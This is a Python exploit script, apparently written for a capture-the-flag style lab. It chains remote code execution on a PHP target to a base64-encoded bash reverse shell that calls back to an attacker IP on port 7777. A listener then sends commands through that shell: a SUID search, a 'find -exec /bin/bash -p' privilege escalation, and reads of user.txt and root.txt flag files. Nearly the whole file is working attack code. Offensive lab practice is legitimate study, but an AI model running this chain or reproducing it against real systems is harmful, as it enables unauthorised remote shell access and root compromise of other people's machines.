import socket
import subprocess
import sys
import time
import threading
import base64
import os

PHASE_ORDER = ["initial-access/rce", "data-exfil", "privilege_escalation"]
PHASE_INDEX = {p: i for i, p in enumerate(PHASE_ORDER)}

def should_run(allowed_phase, required_phase):
    return PHASE_INDEX[required_phase] <= PHASE_INDEX[allowed_phase]

def kill_port(port):
    # Find process using the port and kill it
    try:
        result = subprocess.run(
            ["lsof", "-i", f":{port}"], capture_output=True, text=True
        )
        lines = result.stdout.strip().split('\n')
        for line in lines[1:]:  # Skip header
            pid = int(line.split()[1])
            print(f"Killing process {pid} using port {port}")
            os.kill(pid, 9)
    except Exception as e:
        print(f"Could not kill process on port {port}: {e}")

def setup_listener(allowed_phase):
    """Sets up a netcat-like listener on port 7777"""
    host = '0.0.0.0'
    port = 7777
    kill_port(port)
    print(f"[*] Setting up listener on {host}:{port}")

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Bind to the port
        server_socket.bind((host, port))

        # Queue up to 5 requests
        server_socket.listen(5)
        print("[*] Listening on port 9001...")

        # Establish connection
        client_socket, addr = server_socket.accept()
        print(f"[*] Got connection from {addr}")
        commands = []
        # Send commands to the shell
        if should_run(allowed_phase, 'privilege_escalation'):

            commands = [
                "find / -perm -4000 2>/dev/null",
                "find . -exec /bin/bash -p \; -quit",
                "find / -type f -name 'root.txt' 2>/dev/null",
                "cat /root/root.txt"
            ]
        elif should_run(allowed_phase, 'data-exfil'):
            commands = [
                "find / -type f -name 'user.txt' 2>/dev/null",
                "cat /home/php/user.txt",
            ]
        elif should_run(allowed_phase, 'initial-access/rce'):
            commands = []

        print("[*] Sending commands to the shell:")
        for cmd in commands:
            print(f"[>] Executing: {cmd}")
            client_socket.send(f"{cmd}\n".encode())
            time.sleep(1)

            # Get response
            response = b""
            client_socket.settimeout(2)
            try:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass

            print("[<] Response:")
            print(response.decode('utf-8', errors='ignore'))

    except Exception as e:
        print(f"[!] Error in listener: {e}")
    finally:
        server_socket.close()
        # Close the connection
        client_socket.close()
        print("[*] Listener closed")

def base64cmd(attacker_ip:str):
    text = f"bash -i >& /dev/tcp/{attacker_ip}/7777 0>&1\n"
    text_bytes = text.encode('utf-8')
    encoded_bytes = base64.b64encode(text_bytes)
    return encoded_bytes.decode('utf-8')

def trigger_connection(target_url, ip_address_attacker):
    """Function to trigger the web shell connection after a delay"""
    print("[*] Waiting 5 seconds before triggering the connection...")
    time.sleep(5)

    try:
        # Replace this with your actual script that triggers the connection
        print("[*] Triggering connection to the listener...")
        target_addr = f"{target_url}/index.php"
        encoded_command = "echo " + "'" + f"{base64cmd(ip_address_attacker)}' > shell.sh & cat shell.sh | base64 -d | bash"
        command = f'shell_exec("{encoded_command}");'

        subprocess.run(["python3", "/attacker/scripts/debug-rce/exp.py", "-t", target_addr, "-c", command, "--dbgp-ip", ip_address_attacker])
        print("[*] Connection triggered. Check your listener.")
    except Exception as e:
        print(f"[!] Error triggering connection: {e}")

def main(target_url, ip_address_attacker, allowed_phase):
    print("[*] Starting scan and exploit chain...")
    if target_url:
        print("[*] Starting network listener script")
        listner_thread = threading.Thread(target=setup_listener, args=[allowed_phase])
        listner_thread.start()
        # Start the trigger function in a separate thread
        trigger_thread = threading.Thread(target=trigger_connection, args=[target_url, ip_address_attacker])
        trigger_thread.daemon = True
        trigger_thread.start()

        listner_thread.join()
        trigger_thread.join()
    else:
        print("[-] No vulnerable php instance found")

if __name__ == "__main__":
    """python3 exploit.py subnet, ip_addr_attacker, target_url"""
    if len(sys.argv) != 4:
        print("Correct use:\n python3 exploit.py [ip_address_attacker] [target_url] [allowed_phase]")
        exit(1)
    ip_addr_attacker = str(sys.argv[1])
    target_url = str(sys.argv[2])
    allowed_phase = str(sys.argv[3])
    print(sys.argv)

    main(target_url, ip_addr_attacker, allowed_phase)
